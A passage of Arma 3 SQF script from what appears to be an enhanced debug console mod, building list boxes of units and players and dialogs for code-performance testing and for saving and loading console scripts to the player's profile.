                    _allAI = allUnits - allPlayers; {
                        if ((_x iskindof ''man'') && (!(isPlayer _x))) then {
                            _allAI pushBackUnique _x;
                        };
                    }
                    forEach allDeadMen;
                    _allAI;
                };

                EDC_fnc_listUnits_GUI = {
                    with uiNamespace do {
                        disableSerialization;
                        (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') cbSetChecked true;
                        (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrlCommit 0;
                        (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') cbSetChecked false;
                        (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrlCommit 0;
                        lbClear(uiNameSpace getVariable ''EDC_ctrl_targets'');
                        (uiNameSpace getVariable ''EDC_ctrl_targets'') ctrlCommit 0;
                        comment "_targetsArray = missionNamespace getVariable [''EDC_targetsArray'',[]];
                        missionNamespace setVariable[''EDC_targetsArray'', _targetsArray];
                        ";
                        _allUnits = [] call(missionNamespace getVariable[''EDC_fnc_listUnits'', {}]);
                        _allZeuses = [] call(missionNamespace getVariable[''EDC_fnc_listZeuses'', {}]); {
                            _pictureColor = [side group _x, false] call BIS_fnc_sideColor;
                            if ((isNil ''_pictureColor'') or(_pictureColor isEqualTo[])) then {
                                _pictureColor = [1, 1, 1, 1];
                            };
                            _textColor = [_pictureColor# 0, _pictureColor# 1, _pictureColor# 2, 1];
                            _index = (uiNameSpace getVariable ''EDC_ctrl_targets'') lbAdd name _x;
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\markers\handDrawn\unknown_CA.paa''];
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                            if (isPlayer _x) then {
                                _isZeus = false;
                                _isZeus_scripted = false;
                                if (_x in _allZeuses) then {
                                    _isZeus = true;
                                } else {
                                    if (!isNull(getAssignedCuratorLogic _x)) then {
                                        _isZeus_scripted = true;
                                    };
                                };
                                if (_isZeus) then {
                                    _pictureColor = [0.9, 0.9, 0.9, 1];
                                    _textColor = [0.8, 0.8, 0.8, 1];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f_curator\data\cfgdiary\playerLogic_ca.paa''];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                                } else {
                                    if (_isZeus_scripted) then {
                                        _textColor = [0.8, 0.8, 0.8, 1];
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconMan_ca.paa''];
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                                    } else {
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconMan_ca.paa''];
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                        (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                                    };
                                };
                            } else {
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconManVirtual_ca.paa''];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                            };
                            if ((!alive _x) or(damage _x == 1)) then {
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureRight[_index, ''\a3\ui_f\data\map\Respawn\icon_dead_ca.paa''];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureRightColor[_index, [1, 1, 1, 1]];
                            };
                        }
                        forEach _allUnits;
                        _placeHolders = [
                            '''',
                            ''''
                        ]; {
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbAdd _x;
                        }
                        forEach _placeHolders;
                        (uiNameSpace getVariable ''EDC_ctrl_targets'') ctrlCommit 0;
                    };
                };

                EDC_fnc_listPlayers_GUI = {
                    with uiNamespace do {
                        disableSerialization;
                        (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') cbSetChecked false;
                        (uiNameSpace getVariable ''EDC_ctrl_allUnitsCheckBox'') ctrlCommit 0;
                        (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') cbSetChecked true;
                        (uiNameSpace getVariable ''EDC_ctrl_allPlayersCheckBox'') ctrlCommit 0;
                        lbClear(uiNameSpace getVariable ''EDC_ctrl_targets'');
                        (uiNameSpace getVariable ''EDC_ctrl_targets'') ctrlCommit 0;
                        comment "_targetsArray = missionNamespace getVariable [''EDC_targetsArray'',[]];
                        missionNamespace setVariable[''EDC_targetsArray'', _targetsArray];
                        ";
                        _allPlayers = [] call(missionNamespace getVariable[''EDC_fnc_listPlayers'', {}]);
                        _allZeuses = [] call(missionNamespace getVariable[''EDC_fnc_listZeuses'', {}]); {
                            _pictureColor = [side group _x, false] call BIS_fnc_sideColor;
                            if ((isNil ''_pictureColor'') or(_pictureColor isEqualTo[])) then {
                                _pictureColor = [1, 1, 1, 1];
                            };
                            _textColor = [_pictureColor# 0, _pictureColor# 1, _pictureColor# 2, 1];
                            _index = (uiNameSpace getVariable ''EDC_ctrl_targets'') lbAdd name _x;
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\markers\handDrawn\unknown_CA.paa''];
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                            _isZeus = false;
                            _isZeus_scripted = false;
                            if (_x in _allZeuses) then {
                                _isZeus = true;
                            } else {
                                if (!isNull(getAssignedCuratorLogic _x)) then {
                                    _isZeus_scripted = true;
                                };
                            };
                            if (_isZeus) then {
                                _pictureColor = [0.9, 0.9, 0.9, 1];
                                _textColor = [0.8, 0.8, 0.8, 1];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f_curator\data\cfgdiary\playerLogic_ca.paa''];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                            } else {
                                if (_isZeus_scripted) then {
                                    _textColor = [0.8, 0.8, 0.8, 1];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconMan_ca.paa''];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                                } else {
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPicture[_index, ''\a3\ui_f\data\map\VehicleIcons\iconMan_ca.paa''];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureColor[_index, _pictureColor];
                                    (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetColor[_index, _textColor];
                                };
                            };
                            if ((!alive _x) or(damage _x == 1)) then {
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureRight[_index, ''\a3\ui_f\data\map\Respawn\icon_dead_ca.paa''];
                                (uiNameSpace getVariable ''EDC_ctrl_targets'') lbSetPictureRightColor[_index, [1, 1, 1, 1]];
                            };

                        }
                        forEach _allPlayers;
                        _placeHolders = [
                            '''',
                            ''''
                        ]; {
                            (uiNameSpace getVariable ''EDC_ctrl_targets'') lbAdd _x;
                        }
                        forEach _placeHolders;
                        (uiNameSpace getVariable ''EDC_ctrl_targets'') ctrlCommit 0;
                    };
                };

                comment ''----------------------------------------------------------------------------------'';






                EDC_fnc_removeComments = {
                    _input = _this select 0;
                    private _strings = [];
                    private _start = -1;
                    while {
                        _start = _input find "//";
                        _start > -1
                    }
                    do {
                        _input select[0, _start] call {
                            private _badQuotes = _this call {
                                private _qtsGood = [];
                                private _qtsInfo = [];
                                private _arr = toArray _this; {
                                    _qtsGood pushBack((count _arr - count(_arr - [_x])) % 2 == 0);
                                    _qtsInfo pushBack[_this find toString[_x], _x];
                                }
                                forEach[34, 39];
                                if (_qtsGood isEqualTo[true, true]) exitWith {
                                    0
                                };
                                _qtsInfo sort true;
                                _qtsInfo select 0 select 1
                            };
                            if (_badQuotes > 0) exitWith {
                                _last = _input select[_start] find toString[_badQuotes];
                                if (_last < 0) exitWith {
                                    _strings = [_input];
                                    _input = "";
                                };
                                _last = _start + _last + 1;
                                _strings pushBack(_input select[0, _last]);
                                _input = _input select[_last];
                            };
                            _strings pushBack _this;
                            _input = _input select[_start];
                            private _end = _input find toString[10];
                            if (_end < 0) exitWith {
                                _input = ""
                            };
                            _input = _input select[_end + 1];
                        };
                    };
                    _input = (_strings joinString "") + _input;
                    _input
                };

                EDC_fnc_codePerformance = {
                    with uiNamespace do {
                        disableSerialization;

                        _displayNum = 49;
                        if (isNull(findDisplay 49)) then {
                            _displayNum = 46;
                        };

                        EDC_display_codePerformanceOptions = (findDisplay _displayNum) createDisplay "RscDisplayEmpty";
                        showChat true;

                        _txtSize = safeZoneH * 0.5;

                        _ctrl_ttlCPOptns = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_ttlCPOptns ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.225 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
                        _ctrl_ttlCPOptns ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
                        _ctrl_ttlCPOptns ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Code Performance Test - Options</t>");
                        _ctrl_ttlCPOptns ctrlCommit 0;

                        _ctrl_CPbkrnd1 = EDC_display_codePerformanceOptions ctrlCreate["RscText", -1];
                        _ctrl_CPbkrnd1 ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.258 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.484 * safezoneH];
                        _ctrl_CPbkrnd1 ctrlSetBackgroundColor[-1, -1, -1, 0.7];
                        _ctrl_CPbkrnd1 ctrlCommit 0;

                        _ctrl_CPbkrnd2 = EDC_display_codePerformanceOptions ctrlCreate["RscText", -1];
                        _ctrl_CPbkrnd2 ctrlSetPosition[0.381406 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.237187 * safezoneW, 0.022 * safezoneH];
                        _ctrl_CPbkrnd2 ctrlSetBackgroundColor[-1, -1, -1, 0.8];
                        _ctrl_CPbkrnd2 ctrlCommit 0;

                        _ctrl_ttlCPExp = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_ttlCPExp ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.258 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
                        _ctrl_ttlCPExp ctrlSetBackgroundColor[-1, -1, -1, 0];
                        _ctrl_ttlCPExp ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Expression:</t>");
                        _ctrl_ttlCPExp ctrlCommit 0;

                        _ctrl_ttlCPArg = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_ttlCPArg ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.599 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
                        _ctrl_ttlCPArg ctrlSetBackgroundColor[-1, -1, -1, 0];
                        _ctrl_ttlCPArg ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Arguments:</t>");
                        _ctrl_ttlCPArg ctrlCommit 0;

                        _ctrl_ttlCPCyc = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_ttlCPCyc ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.643 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
                        _ctrl_ttlCPCyc ctrlSetBackgroundColor[-1, -1, -1, 0];
                        _ctrl_ttlCPCyc ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Cycles:</t>");
                        _ctrl_ttlCPCyc ctrlCommit 0;

                        _ctrl_ttlCPDis = EDC_display_codePerformanceOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_ttlCPDis ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.687 * safezoneH + safezoneY, 0.4125 * safezoneW, 0.022 * safezoneH];
                        _ctrl_ttlCPDis ctrlSetBackgroundColor[-1, -1, -1, 0];
                        _ctrl_ttlCPDis ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1)) + "'' align=''left'' valign=''middle''>Display:</t>");
                        _ctrl_ttlCPDis ctrlCommit 0;

                        _ctrl_btnCPCancel = EDC_display_codePerformanceOptions ctrlCreate["RscButtonMenu", -1];
                        _ctrl_btnCPCancel ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.0825 * safezoneW, 0.022 * safezoneH];
                        _ctrl_btnCPCancel ctrlSetBackgroundColor[0, 0, 0, 0.8];
                        _ctrl_btnCPCancel ctrlSetStructuredText parseText("<t shadow=''0'' size=''" + (str(_txtSize * 1)) + "'' align=''center'' valign=''middle''>CANCEL</t>");
                        _ctrl_btnCPCancel ctrladdEventHandler["ButtonClick", {
                            (uiNamespace getVariable ''EDC_display_codePerformanceOptions'') closeDisplay 0;
                            if (!(isNull(finddisplay 49))) then {
                                showChat false;
                            };
                        }];
                        _ctrl_btnCPCancel ctrlCommit 0;

                        EDC_ctrl_CPOExpression = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
                        EDC_ctrl_CPOExpression ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.319 * safezoneH];
                        EDC_ctrl_CPOExpression ctrlSetBackgroundColor[-1, -1, -1, 0.4];
                        EDC_ctrl_CPOExpression ctrlSetText(profileNamespace getVariable["RscDebugConsole_expression", "comment ''input expression'';"]);
                        EDC_ctrl_CPOExpression ctrlCommit 0;

                        EDC_ctrl_CPOArguments = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
                        EDC_ctrl_CPOArguments ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.621 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
                        EDC_ctrl_CPOArguments ctrlSetBackgroundColor[-1, -1, -1, 0.4];
                        EDC_ctrl_CPOArguments ctrlSetText "[]";
                        EDC_ctrl_CPOArguments ctrlCommit 0;

                        EDC_ctrl_CPOCycles = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
                        EDC_ctrl_CPOCycles ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.665 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
                        EDC_ctrl_CPOCycles ctrlSetBackgroundColor[-1, -1, -1, 0.4];
                        EDC_ctrl_CPOCycles ctrlSetText "1";
                        EDC_ctrl_CPOCycles ctrlCommit 0;

                        EDC_ctrl_CPODisplay = EDC_display_codePerformanceOptions ctrlCreate["RscEditMulti", -1];
                        EDC_ctrl_CPODisplay ctrlSetPosition[0.298906 * safezoneW + safezoneX, 0.709 * safezoneH + safezoneY, 0.402187 * safezoneW, 0.022 * safezoneH];
                        EDC_ctrl_CPODisplay ctrlSetBackgroundColor[-1, -1, -1, 0.4];
                        EDC_ctrl_CPODisplay ctrlSetText "(findDisplay 46)";
                        EDC_ctrl_CPODisplay ctrlCommit 0;

                        _ctrl_btnCPStart = EDC_display_codePerformanceOptions ctrlCreate["RscButtonMenu", -1];
                        _ctrl_btnCPStart ctrlSetPosition[0.29375 * safezoneW + safezoneX, 0.753 * safezoneH + safezoneY, 0.0825 * safezoneW, 0.022 * safezoneH];
                        _ctrl_btnCPStart ctrlSetBackgroundColor[0, 0, 0, 0.8];
                        _ctrl_btnCPStart ctrlSetStructuredText parseText("<t shadow=''0'' size=''" + (str(_txtSize * 0.7)) + "'' align=''left'' valign=''middle''><img image=''\a3\Ui_f\data\GUI\RscCommon\RscDebugConsole\performance_ca.paa''></img><t align=''left'' size=''" + (str(_txtSize * 1)) + "''>  START TEST</t>");
                        _ctrl_btnCPStart ctrladdEventHandler["ButtonClick", {
                            _expression_input = '''';
                            _arguments_input = '''';
                            _cycles_input = '''';
                            _display_input = '''';

                            with uiNameSpace do {
                                _expression_input = ctrlText EDC_ctrl_CPOExpression;
                                _arguments_input = ctrlText EDC_ctrl_CPOArguments;
                                _cycles_input = ctrlText EDC_ctrl_CPOCycles;
                                _display_input = ctrlText EDC_ctrl_CPODisplay;
                            };

                            comment "----------------------";

                            private _expressionHistory = profileNamespace getVariable["RscDebugConsole_expressionHistory", []];
                            private _currentExpression = _expression_input;
                            if (_expressionHistory isEqualTo[]) then {
                                profileNamespace setvariable["RscDebugConsole_expressionHistory", [_currentExpression]];
                                _expressionHistory = profileNamespace getVariable "RscDebugConsole_expressionHistory";
                            };
                            _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                            private _lastExpression = profileNamespace getVariable["RscDebugConsole_expression", ""];

                            if (_lastExpression isEqualTo "" || _currentExpression isEqualTo _lastExpression) then {
                                _expressionHistory set[count _expressionHistory - 1, _currentExpression];
                            }
                            else {
                                if (_expressionHistory pushBack _currentExpression >= 10) then {
                                    _expressionHistory deleteRange[0, count _expressionHistory - 10]
                                };
                            };

                            profileNamespace setVariable["RscDebugConsole_expression", _currentExpression];
                            _parentDisplay setVariable["RscDebugConsole_expressionHistory_index", count _expressionHistory - 1];
                            comment "saveProfileNamespace;";

                            comment "----------------------------";

                            _expression_input = [_expression_input] call EDC_fnc_removeComments;
                            _arguments_input = [_arguments_input] call EDC_fnc_removeComments;
                            _cycles_input = [_cycles_input] call EDC_fnc_removeComments;
                            _display_input = [_display_input] call EDC_fnc_removeComments;

                            _expression = _expression_input;
                            _arguments = [] call(compile _arguments_input);
                            _cycles = _cycles_input call BIS_fnc_parseNumber;
                            _display = [] call(compile _display_input);

                            with uiNameSpace do {
                                EDC_display_codePerformanceOptions closeDisplay 0;
                            };

                            [_expression, _arguments, _cycles, _display]
                            call BIS_fnc_codePerformance;

                            if (!(isNull(findDisplay 49))) then {
                                showChat false;
                                [] spawn {
                                    waitUntil {
                                        (isNull(findDisplay 49))
                                    };
                                    showChat true;
                                };
                            };
                        }];
                        _ctrl_btnCPStart ctrlCommit 0;
                    };
                };

                EDC_fnc_saveScript = {
                    params[[''_script'', '''']];
                    with uiNamespace do {
                        disableSerialization;

                        _displayNum = 49;
                        if (isNull(findDisplay 49)) then {
                            _displayNum = 46;
                        };

                        EDC_display_saveScriptOptions = (findDisplay _displayNum) createDisplay "RscDisplayEmpty";
                        showChat true;
                        _txtSize = safeZoneH * 0.5;

                        _ctrl_title = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_title ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.236 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.022 * safezoneH];
                        _ctrl_title ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
                        _ctrl_title ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Save Script</t>");
                        _ctrl_title ctrlCommit 0;

                        _ctrl_background = EDC_display_saveScriptOptions ctrlCreate["RscText", -1];
                        _ctrl_background ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.269 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.44 * safezoneH];
                        _ctrl_background ctrlSetBackgroundColor[0, 0, 0, 0.6];
                        _ctrl_background ctrlCommit 0;

                        _ctrl_titleSaveAs = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_titleSaveAs ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titleSaveAs ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titleSaveAs ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Save As</t>");
                        _ctrl_titleSaveAs ctrlCommit 0;

                        _ctrl_titlePreview = EDC_display_saveScriptOptions ctrlCreate["RscStructuredText", -1];
                        _ctrl_titlePreview ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.346 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titlePreview ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titlePreview ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Preview</t>");
                        _ctrl_titlePreview ctrlCommit 0;

                        EDC_saveScriptOptions_ctrl_SaveAs = EDC_display_saveScriptOptions ctrlCreate["RscEdit", -1];
                        EDC_saveScriptOptions_ctrl_SaveAs ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.302 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.033 * safezoneH];
                        EDC_saveScriptOptions_ctrl_SaveAs ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];
                        _savedScriptsCount = count _savedScripts;
                        _saveAsTextUnique = format[''New Script %1'', _savedScriptsCount + 1];
                        EDC_saveScriptOptions_ctrl_SaveAs ctrlSetText _saveAsTextUnique;
                        EDC_saveScriptOptions_ctrl_SaveAs ctrlCommit 0;

                        EDC_saveScriptOptions_ctrl_Preview = EDC_display_saveScriptOptions ctrlCreate["RscEditMulti", -1];
                        EDC_saveScriptOptions_ctrl_Preview ctrlSetPosition[0.31953 * safezoneW + safezoneX, 0.368 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.33 * safezoneH];
                        EDC_saveScriptOptions_ctrl_Preview ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        EDC_saveScriptOptions_ctrl_Preview ctrlSetText _script;
                        EDC_saveScriptOptions_ctrl_Preview ctrlCommit 0;

                        _buttonCancel = EDC_display_saveScriptOptions ctrlCreate["RscButtonMenu", -1];
                        _buttonCancel ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonCancel ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>CANCEL</t>");
                        _buttonCancel ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _parentDisplay = ctrlParent _control;
                                _parentDisplay closeDisplay 0;
                            };
                        }];
                        _buttonCancel ctrlCommit 0;

                        _buttonSave = EDC_display_saveScriptOptions ctrlCreate["RscButtonMenu", -1];
                        _buttonSave ctrlSetPosition[0.62375 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonSave ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>SAVE</t>");
                        _buttonSave ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _parentDisplay = ctrlParent _control;
                                _script = ctrlText EDC_saveScriptOptions_ctrl_Preview;
                                _scriptName = ctrlText EDC_saveScriptOptions_ctrl_SaveAs;
                                if ((_scriptName == '''') or(_script == '''')) exitWith {
                                    showChat true;
                                    systemChat ''Error : Script name or expression is blank.'';
                                    if (!isGamePaused) then {
                                        playSound ''additemfailed'';
                                    };
                                };
                                _savedScripts = profileNamespace getVariable[''EDC_savedScripts'', []];
                                _scriptFound = false; {
                                    if (_x select 0 == _scriptName) exitWith {
                                        _scriptFound = true;
                                    };
                                }
                                forEach _savedScripts;
                                if (_scriptFound) exitWith {
                                    showChat true;
                                    systemChat ''Error : There is already a script with that name.'';
                                    if (!isGamePaused) then {
                                        playSound ''additemfailed'';
                                    };
                                };
                                _scriptElement = [_scriptName, _script];
                                _savedScripts pushBackUnique _scriptElement;
                                profileNamespace setVariable[''EDC_savedScripts'', _savedScripts];
                                saveProfileNamespace;
                                _parentDisplay closeDisplay 0;
                                systemChat format[''Script %1 saved to profile'', _scriptName];
                                if (!isGamePaused) then {
                                    playSound ''addItemOk'';
                                };
                            };
                        }];
                        _buttonSave ctrlCommit 0;
                    };
                };

                EDC_fnc_loadScript = {
                    with uiNamespace do {
                        disableSerialization;

                        _displayNum = 49;
                        if (isNull(findDisplay 49)) then {
                            _displayNum = 46;
                        };

                        EDC_display_loadScript = (findDisplay _displayNum) createDisplay "RscDisplayEmpty";
                        showChat true;
                        _txtSize = safeZoneH * 0.5;

                        _ctrl_title = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
                        _ctrl_title ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.236 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.022 * safezoneH];
                        _ctrl_title ctrlSetBackgroundColor[(profilenamespace getvariable[''GUI_BCG_RGB_R'', 0.13]), (profilenamespace getvariable[''GUI_BCG_RGB_G'', 0.54]), (profilenamespace getvariable[''GUI_BCG_RGB_B'', 0.21]), (profilenamespace getvariable[''GUI_BCG_RGB_A'', 0.8])];
                        _ctrl_title ctrlSetStructuredText parseText("<t shadow=''0'' font=''PuristaMedium'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Load Script</t>");
                        _ctrl_title ctrlCommit 0;

                        _ctrl_background = EDC_display_loadScript ctrlCreate["RscText", -1];
                        _ctrl_background ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.269 * safezoneH + safezoneY, 0.381563 * safezoneW, 0.44 * safezoneH];
                        _ctrl_background ctrlSetBackgroundColor[0, 0, 0, 0.6];
                        _ctrl_background ctrlCommit 0;

                        _ctrl_titleScripts = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
                        _ctrl_titleScripts ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.28 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titleScripts ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titleScripts ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Scripts</t>");
                        _ctrl_titleScripts ctrlCommit 0;

                        _ctrl_titleSelected = EDC_display_loadScript ctrlCreate["RscStructuredText", -1];
                        _ctrl_titleSelected ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.467 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.022 * safezoneH];
                        _ctrl_titleSelected ctrlSetBackgroundColor[0, 0, 0, 0];
                        _ctrl_titleSelected ctrlSetStructuredText parseText("<t shadow=''1'' font=''RobotoCondensed'' size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>Selected</t>");
                        _ctrl_titleSelected ctrlCommit 0;

                        _buttonCancel = EDC_display_loadScript ctrlCreate["RscButtonMenu", -1];
                        _buttonCancel ctrlSetPosition[0.309219 * safezoneW + safezoneX, 0.72 * safezoneH + safezoneY, 0.0670312 * safezoneW, 0.022 * safezoneH];
                        _buttonCancel ctrlSetStructuredText parseText("<t size=''" + (str(_txtSize * 1.1)) + "'' align=''left'' valign=''middle''>CANCEL</t>");
                        _buttonCancel ctrlSetTooltip ''Close'';
                        _buttonCancel ctrlAddEventHandler["ButtonClick", {
                            params["_control"];
                            with uiNamespace do {
                                disableSerialization;
                                _parentDisplay = ctrlParent _control;
                                _parentDisplay closeDisplay 0;
                            };
                        }];
                        _buttonCancel ctrlCommit 0;

                        EDC_loadScript_ctrl_scriptName = EDC_display_loadScript ctrlCreate["RscEdit", -1];
                        EDC_loadScript_ctrl_scriptName ctrlSetPosition[0.319531 * safezoneW + safezoneX, 0.5 * safezoneH + safezoneY, 0.360937 * safezoneW, 0.033 * safezoneH];
                        EDC_loadScript_ctrl_scriptName ctrlSetBackgroundColor[0, 0, 0, 0.5];
                        EDC_loadScript_ctrl_scriptName ctrlSetText '''';
                        EDC_loadScript_ctrl_scriptName ctrlCommit 0;

